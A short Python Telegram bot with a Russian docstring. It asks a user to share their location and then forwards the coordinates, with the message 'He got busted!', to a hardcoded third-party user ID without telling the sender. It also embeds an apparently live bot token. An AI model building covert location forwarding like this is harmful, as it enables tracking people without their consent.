'''
Идея программы.
* Поступает запрос на местоположение определенного человека. Этому человеку (по его id или нику) скидывает сообщение.
* Человек отправляет свои координаты. При отправлении координат записываются в БД широта и долгота.
* Запрашиваемому скидываются координаты посредством bot.send_location(message.chat.id, *latitude*, *longitude*)
'''

import telebot
from telebot import types

bot = telebot.TeleBot('6447415648:AAHAZrEnHgt7Vtlq8aaptxLuGUd4ZlQCLig')

@bot.message_handler(commands=["start"])
def main(message):
    # Создание кнопки
    keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    keyboard.add(types.KeyboardButton(text="Отправить местоположение", request_location=True))
    # Предложение отправить свои координаты
    bot.send_message(message.chat.id, "Отправьте свои коордианты!", reply_markup=keyboard)
    # Выполнение метода click после нажатия кнопки
    bot.register_next_step_handler(message, click)

def click(message):
    # При нажатии на кнопку человек с заданным ID скидывается местоположение со словами "Он спалился!"
    userID = 514538959
    bot.send_message(userID, 'Он спалился!')
    bot.send_location(userID, message.location.latitude, message.location.longitude)

bot.polling(non_stop=True)